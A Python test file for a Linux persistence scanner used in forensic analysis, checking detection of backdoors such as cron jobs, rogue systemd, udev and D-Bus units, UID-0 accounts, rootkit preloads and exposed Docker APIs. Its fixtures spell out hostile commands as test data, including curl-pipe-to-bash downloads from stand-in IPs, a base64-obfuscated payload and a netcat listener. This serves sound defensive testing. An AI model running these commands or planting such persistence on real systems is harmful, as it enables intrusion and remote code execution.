"""Tests for the Linux persistence scanner.

These run against the bundled attack-scenario-01/fs/ tree — they don't
require a live SIFT workstation or any privileged operations.
"""

from pathlib import Path

import pytest

from findevil.tools.linux_persistence import (
    PersistenceFinding,
    _match_suspicious,
    _parse_passwd,
    _parse_shadow,
    scan_all,
    scan_atjobs,
    scan_authorized_keys,
    scan_container_persistence,
    scan_cron,
    scan_dbus,
    scan_devshm_executables,
    scan_init,
    scan_kernel_modules,
    scan_library_preload,
    scan_shell_init,
    scan_systemd,
    scan_udev,
    scan_users,
)

SAMPLE_FS = Path(__file__).parent.parent / "samples" / "attack-scenario-01" / "fs"


# ---------------------------------------------------------------------------
# Unit tests for heuristic helpers
# ---------------------------------------------------------------------------


def test_match_suspicious_finds_curl_download():
    reasons = _match_suspicious("curl https://185.177.124.22/x.sh")
    assert any("download" in r for r in reasons)


def test_match_suspicious_finds_tmp_path():
    reasons = _match_suspicious("ExecStart=/bin/bash /tmp/.x")
    assert any("world-writable" in r for r in reasons)


def test_match_suspicious_finds_netcat():
    reasons = _match_suspicious("nc -lvnp 4444")
    assert any("listener" in r.lower() or "network" in r.lower() for r in reasons)


def test_match_suspicious_ignores_clean_content():
    assert _match_suspicious("alias ls='ls --color=auto'") == []


# ---------------------------------------------------------------------------
# /etc/passwd and /etc/shadow parsing
# ---------------------------------------------------------------------------


def test_parse_passwd_finds_all_entries():
    content = (SAMPLE_FS / "etc/passwd").read_text()
    entries = _parse_passwd(content)
    usernames = {e["username"] for e in entries}
    assert "root" in usernames
    assert "sysd" in usernames
    assert "toor" in usernames


def test_parse_shadow_extracts_passwords():
    content = (SAMPLE_FS / "etc/shadow").read_text()
    sh = _parse_shadow(content)
    assert sh["root"].startswith("$6$")  # hashed
    assert sh["toor"] == ""  # empty password — backdoor


# ---------------------------------------------------------------------------
# Individual scanners against the sample compromised FS
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_users_flags_uid_zero_and_empty_password():
    findings = scan_users(SAMPLE_FS)
    # Should find `toor` (UID 0) and its empty password
    usernames_flagged = {f.summary for f in findings}
    assert any("toor" in s for s in usernames_flagged)
    all_reasons = " ".join(r for f in findings for r in f.reasons)
    assert "UID 0" in all_reasons
    assert "EMPTY password" in all_reasons


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_cron_flags_curl_download_in_cron_d():
    findings = scan_cron(SAMPLE_FS)
    high = [f for f in findings if f.severity == "high"]
    assert high, "expected cron to flag at least one file"
    reasons = " ".join(r for f in high for r in f.reasons)
    assert "download" in reasons.lower() or "outbound" in reasons.lower()


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_systemd_flags_tmp_execstart():
    findings = scan_systemd(SAMPLE_FS)
    high = [f for f in findings if f.severity == "high"]
    assert high, "expected systemd scan to flag sysd-helper.service"
    reasons = " ".join(r for f in high for r in f.reasons)
    assert "world-writable" in reasons or "/tmp" in reasons.lower()


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_authorized_keys_flags_missing_comment():
    findings = scan_authorized_keys(SAMPLE_FS)
    # Root has two commented legit keys + one anonymous attacker key
    root_findings = [f for f in findings if "root" in f.path]
    assert root_findings
    sample_text = " ".join(f.sample for f in root_findings)
    assert "no key comment" in sample_text


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_shell_init_flags_bashrc_autorun():
    findings = scan_shell_init(SAMPLE_FS)
    high = [f for f in findings if f.severity == "high"]
    # sysd's .bashrc runs /tmp/.x; alice's is clean
    assert any("sysd" in f.path for f in high), "expected sysd .bashrc to be flagged"
    assert not any("alice" in f.path and f.severity == "high" for f in findings)


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_library_preload_flags_libprocesshider():
    findings = scan_library_preload(SAMPLE_FS)
    assert findings, "expected ld.so.preload to be flagged"
    reasons = " ".join(r for f in findings for r in f.reasons)
    assert "libprocesshider" in reasons or "rootkit" in reasons.lower()


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_all_produces_multiple_categories():
    findings = scan_all(SAMPLE_FS)
    categories = {f.category for f in findings}
    # We expect at minimum these categories to produce findings
    required = {"user", "cron", "systemd", "ssh", "shell", "library"}
    missing = required - categories
    assert not missing, f"missing expected categories: {missing}"


@pytest.mark.skipif(not SAMPLE_FS.exists(), reason="sample FS not present")
def test_scan_all_high_severity_covers_full_attack():
    findings = scan_all(SAMPLE_FS)
    high = [f for f in findings if f.severity == "high"]
    # The attack planted persistence in at least 5 different classes
    high_categories = {f.category for f in high}
    # Must find high-severity in these categories
    expected = {"user", "cron", "systemd", "shell", "library"}
    missing = expected - high_categories
    assert not missing, f"missing high-severity in: {missing}"


# ---------------------------------------------------------------------------
# /etc/init.d/* scanner — Mirai/BPFDoor/HiddenWasp surface
# ---------------------------------------------------------------------------


def test_scan_init_flags_devshm_exec_in_initd_script(tmp_path):
    initd = tmp_path / "etc/init.d"
    initd.mkdir(parents=True)
    (initd / "watchdog-init").write_text(
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n# Provides: watchdog-init\n### END INIT INFO\n"
        "exec /dev/shm/kdmtmpflush &\n"
    )
    findings = scan_init(tmp_path)
    matching = [f for f in findings if "watchdog-init" in f.path]
    assert matching, "non-stock init.d script with /dev/shm exec was not flagged"
    assert matching[0].severity == "high"
    assert any("world-writable" in r for r in matching[0].reasons)


def test_scan_init_flags_nonstock_initd_at_medium(tmp_path):
    initd = tmp_path / "etc/init.d"
    initd.mkdir(parents=True)
    (initd / "custom-service").write_text(
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n# Provides: custom-service\n### END INIT INFO\n"
        "echo started\n"
    )
    findings = scan_init(tmp_path)
    matching = [f for f in findings if "custom-service" in f.path]
    assert matching, "non-stock init.d script was not surfaced at all"
    assert matching[0].severity in ("high", "medium")


def test_scan_init_does_not_flag_stock_scripts(tmp_path):
    initd = tmp_path / "etc/init.d"
    initd.mkdir(parents=True)
    (initd / "ssh").write_text("#!/bin/sh\n# stock openssh-server init\n")
    (initd / "cron").write_text("#!/bin/sh\n# stock cron init\n")
    findings = scan_init(tmp_path)
    flagged_names = {Path(f.path).name for f in findings}
    assert "ssh" not in flagged_names
    assert "cron" not in flagged_names


# ---------------------------------------------------------------------------
# /dev/shm executable scanner — BPFDoor surface
# ---------------------------------------------------------------------------


def test_scan_devshm_flags_elf_binary(tmp_path):
    devshm = tmp_path / "dev/shm"
    devshm.mkdir(parents=True)
    (devshm / "kdmtmpflush").write_bytes(b"\x7fELF" + b"\x00" * 64)
    findings = scan_devshm_executables(tmp_path)
    assert findings, "ELF binary in /dev/shm was not flagged"
    assert findings[0].category == "devshm"
    assert findings[0].severity == "high"
    assert "kdmtmpflush" in findings[0].path


def test_scan_devshm_clean_dir_returns_empty(tmp_path):
    devshm = tmp_path / "dev/shm"
    devshm.mkdir(parents=True)
    # Empty /dev/shm is the normal state
    findings = scan_devshm_executables(tmp_path)
    assert findings == []


def test_scan_devshm_skips_non_executable_data(tmp_path):
    devshm = tmp_path / "dev/shm"
    devshm.mkdir(parents=True)
    p = devshm / "shared_buffer"
    p.write_bytes(b"\x00" * 4096)  # not ELF, not script, no exec bit
    p.chmod(0o644)
    findings = scan_devshm_executables(tmp_path)
    assert findings == [], "non-executable /dev/shm data should not be flagged"


# ---------------------------------------------------------------------------
# /lib/modules/*/extra/*.ko scanner — Diamorphine surface
# ---------------------------------------------------------------------------


def test_scan_kernel_modules_flags_extra_ko(tmp_path):
    extra = tmp_path / "lib/modules/6.0.0-generic/extra"
    extra.mkdir(parents=True)
    (extra / "diamorphine.ko").write_bytes(b"\x7fELF" + b"\x00" * 64)
    findings = scan_kernel_modules(tmp_path)
    matching = [f for f in findings if "diamorphine.ko" in f.path]
    assert matching, "out-of-tree .ko file was not flagged"
    assert matching[0].severity == "high"
    assert any("Diamorphine" in r or "extra" in r for r in matching[0].reasons)


def test_scan_kernel_modules_ignores_distribution_ko(tmp_path):
    # Distribution modules live under .../kernel/, NOT .../extra/
    kdir = tmp_path / "lib/modules/6.0.0-generic/kernel/drivers/net"
    kdir.mkdir(parents=True)
    (kdir / "e1000.ko").write_bytes(b"\x7fELF" + b"\x00" * 64)
    findings = scan_kernel_modules(tmp_path)
    flagged_paths = {f.path for f in findings}
    assert not any("e1000.ko" in p for p in flagged_paths)


# ---------------------------------------------------------------------------
# Path-component matching — defends against substring confusion
# ---------------------------------------------------------------------------


def test_scan_authorized_keys_does_not_flag_user_named_with_root_substring(tmp_path):
    """A username like `groot` must not trip the /root/.ssh/ multi-key heuristic.

    Regression test: the original code used `"root" in str(p)`, which matched
    `/home/groot/.ssh/authorized_keys` as if it were `/root/.ssh/authorized_keys`.
    """
    home_dir = tmp_path / "home/groot/.ssh"
    home_dir.mkdir(parents=True)
    (home_dir / "authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2E groot@laptop\n"
        "ssh-rsa AAAAB3NzaC1yc2F groot@desktop\n"
    )
    findings = scan_authorized_keys(tmp_path)
    groot_findings = [f for f in findings if "groot" in f.path]
    assert groot_findings, "scanner should still emit a finding for /home/groot/.ssh/authorized_keys"
    all_reasons = " ".join(r for f in groot_findings for r in f.reasons)
    assert "lateral-movement backdoor" not in all_reasons, (
        "the multi-key /root/ heuristic must not fire on /home/groot/"
    )


def test_scan_authorized_keys_does_flag_real_root_with_multiple_keys(tmp_path):
    """The /root/.ssh/ multi-key heuristic must still fire on the genuine path."""
    root_ssh = tmp_path / "root/.ssh"
    root_ssh.mkdir(parents=True)
    (root_ssh / "authorized_keys").write_text(
        "ssh-rsa AAAAB3NzaC1yc2E root@admin\n"
        "ssh-rsa AAAAB3NzaC1yc2F unknown\n"
    )
    findings = scan_authorized_keys(tmp_path)
    matching = [f for f in findings if "root/.ssh/authorized_keys" in f.path]
    assert matching, "scanner missed /root/.ssh/authorized_keys"
    all_reasons = " ".join(r for f in matching for r in f.reasons)
    assert "lateral-movement backdoor" in all_reasons


def test_scan_systemd_user_unit_runs_as_root_still_fires(tmp_path):
    """Sanity check that the path-component-aware check still flags the real /home/ case."""
    real_home = tmp_path / "home/svc/.config/systemd/user"
    real_home.mkdir(parents=True)
    (real_home / "harmless.service").write_text(
        "[Service]\nUser=root\nExecStart=/usr/bin/true\n"
    )
    findings = scan_systemd(tmp_path)
    home_findings = [f for f in findings if f.path.startswith("home/")]
    assert home_findings
    home_reasons = " ".join(r for f in home_findings for r in f.reasons)
    assert "user unit runs as root" in home_reasons


# ---------------------------------------------------------------------------
# udev / at-job / D-Bus scanners — close the §8.4 documented blind spots
# ---------------------------------------------------------------------------


def test_scan_udev_flags_run_to_world_writable_path(tmp_path):
    rules_d = tmp_path / "etc/udev/rules.d"
    rules_d.mkdir(parents=True)
    (rules_d / "99-backdoor.rules").write_text(
        'ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.evil-handler"\n'
    )
    findings = scan_udev(tmp_path)
    matching = [f for f in findings if "99-backdoor.rules" in f.path]
    assert matching, "udev rule with /tmp RUN target was not flagged"
    assert matching[0].severity == "high"
    reasons = " ".join(matching[0].reasons)
    assert "world-writable" in reasons or "/tmp" in reasons


def test_scan_udev_does_not_flag_stock_rules(tmp_path):
    rules_d = tmp_path / "lib/udev/rules.d"
    rules_d.mkdir(parents=True)
    (rules_d / "60-input-id.rules").write_text(
        '# stock — no RUN, no IMPORT\nKERNEL=="event*", MODE="0660"\n'
    )
    findings = scan_udev(tmp_path)
    assert findings == [], "stock udev rule with no RUN/IMPORT should not flag"


def test_scan_atjobs_flags_curl_in_atspool(tmp_path):
    spool = tmp_path / "var/spool/cron/atjobs"
    spool.mkdir(parents=True)
    (spool / "a000020187c2e8f").write_text(
        "#!/bin/sh\nexport SHELL=/bin/bash\n"
        "curl -s https://198.51.100.202/payload.sh | bash\n"
    )
    findings = scan_atjobs(tmp_path)
    matching = [f for f in findings if "a000020187c2e8f" in f.path]
    assert matching, "at-job with curl-piped payload was not flagged"
    assert matching[0].severity == "high"
    reasons = " ".join(matching[0].reasons)
    assert "download" in reasons.lower() or "curl" in reasons.lower()


def test_scan_atjobs_surfaces_clean_jobs_at_medium(tmp_path):
    """A future-execution at-job is worth surfacing even if its body looks
    clean — the agent should know something is queued."""
    spool = tmp_path / "var/spool/atjobs"
    spool.mkdir(parents=True)
    (spool / "a000010199e3d2").write_text(
        "#!/bin/sh\necho 'scheduled maintenance'\n"
    )
    findings = scan_atjobs(tmp_path)
    matching = [f for f in findings if "a000010199e3d2" in f.path]
    assert matching, "any at-job should be surfaced even if body is benign"
    assert matching[0].severity == "medium"


def test_scan_atjobs_skips_atd_state_files(tmp_path):
    """`.SEQ` and `.lockfile` are atd state, not user jobs — must be skipped."""
    spool = tmp_path / "var/spool/cron/atjobs"
    spool.mkdir(parents=True)
    (spool / ".SEQ").write_text("12345")
    (spool / ".lockfile").write_text("")
    findings = scan_atjobs(tmp_path)
    assert findings == [], "atd state dotfiles must not produce findings"


def test_scan_dbus_flags_exec_to_tmp(tmp_path):
    sysservices = tmp_path / "usr/share/dbus-1/system-services"
    sysservices.mkdir(parents=True)
    (sysservices / "org.evil.Backdoor.service").write_text(
        "[D-BUS Service]\n"
        "Name=org.evil.Backdoor\n"
        "Exec=/tmp/.bd-handler\n"
        "User=root\n"
    )
    findings = scan_dbus(tmp_path)
    matching = [f for f in findings if "org.evil.Backdoor" in f.path]
    assert matching, "D-Bus service with /tmp Exec was not flagged"
    assert matching[0].severity == "high"


def test_scan_dbus_clean_service_not_flagged(tmp_path):
    sysservices = tmp_path / "usr/share/dbus-1/system-services"
    sysservices.mkdir(parents=True)
    (sysservices / "org.freedesktop.PolicyKit1.service").write_text(
        "[D-BUS Service]\n"
        "Name=org.freedesktop.PolicyKit1\n"
        "Exec=/usr/lib/policykit-1/polkitd\n"
        "User=root\n"
    )
    findings = scan_dbus(tmp_path)
    assert findings == [], "stock D-Bus service to /usr/lib path should not flag"


def test_scan_all_includes_udev_atjob_dbus_findings(tmp_path):
    # udev
    (tmp_path / "etc/udev/rules.d").mkdir(parents=True)
    (tmp_path / "etc/udev/rules.d/99-evil.rules").write_text(
        'ACTION=="add", RUN+="/tmp/.x"\n'
    )
    # at-job
    (tmp_path / "var/spool/cron/atjobs").mkdir(parents=True)
    (tmp_path / "var/spool/cron/atjobs/a000010199e3d2").write_text(
        "#!/bin/sh\ncurl -s https://1.2.3.4/x | bash\n"
    )
    # D-Bus
    (tmp_path / "usr/share/dbus-1/system-services").mkdir(parents=True)
    (tmp_path / "usr/share/dbus-1/system-services/org.evil.service").write_text(
        "[D-BUS Service]\nName=org.evil\nExec=/tmp/.bd\n"
    )
    findings = scan_all(tmp_path)
    cats = {f.category for f in findings}
    assert "udev" in cats
    assert "atjob" in cats
    assert "dbus" in cats


# ---------------------------------------------------------------------------
# Base64 decode pass — closes S09 evasion class
# ---------------------------------------------------------------------------


def test_match_suspicious_decodes_base64_curl():
    """Regression for S09: a base64-encoded `curl https://...` blob inside
    otherwise innocuous text must be decoded and matched."""
    import base64
    payload = b"curl -s https://198.51.100.55/x.sh | bash"
    encoded = base64.b64encode(payload).decode()
    text = f"echo {encoded} | base64 -d | sh"
    reasons = _match_suspicious(text)
    # Direct match: "obfuscated execution" (base64 -d is in the patterns)
    assert any("obfuscated" in r for r in reasons)
    # Decoded match: the inner curl + http URL should now also fire
    assert any("decoded from base64" in r for r in reasons), (
        f"expected base64-decoded suspicious match, got: {reasons}"
    )


def test_match_suspicious_does_not_decode_random_blob():
    """A base64-shaped string that doesn't decode to a suspicious shell
    payload must not produce a false-positive 'decoded' annotation."""
    text = "the cert fingerprint is AbCdEfGhIjKlMnOpQrStUvWxYz1234567890=="
    reasons = _match_suspicious(text)
    assert not any("decoded from base64" in r for r in reasons)


# ---------------------------------------------------------------------------
# Container-persistence integration — TeamTNT-shape Docker daemon tampering
# ---------------------------------------------------------------------------


def test_scan_container_persistence_flags_exposed_docker_api(tmp_path):
    docker_dir = tmp_path / "etc/docker"
    docker_dir.mkdir(parents=True)
    (docker_dir / "daemon.json").write_text(
        '{\n'
        '  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2375"],\n'
        '  "tls": false\n'
        '}\n'
    )
    findings = scan_container_persistence(tmp_path)
    assert findings, "TeamTNT-shape Docker daemon config was not surfaced"
    assert any(f.category == "container" for f in findings)
    matching = [f for f in findings if "daemon.json" in f.path]
    assert matching
    assert any("2375" in r or "tcp" in r.lower() for r in matching[0].reasons)


def test_scan_all_includes_container_findings(tmp_path):
    docker_dir = tmp_path / "etc/docker"
    docker_dir.mkdir(parents=True)
    (docker_dir / "daemon.json").write_text(
        '{"hosts": ["tcp://0.0.0.0:2375"], "tls": false}\n'
    )
    findings = scan_all(tmp_path)
    container_findings = [f for f in findings if f.category == "container"]
    assert container_findings, "scan_all should surface container findings via scan_container_persistence"
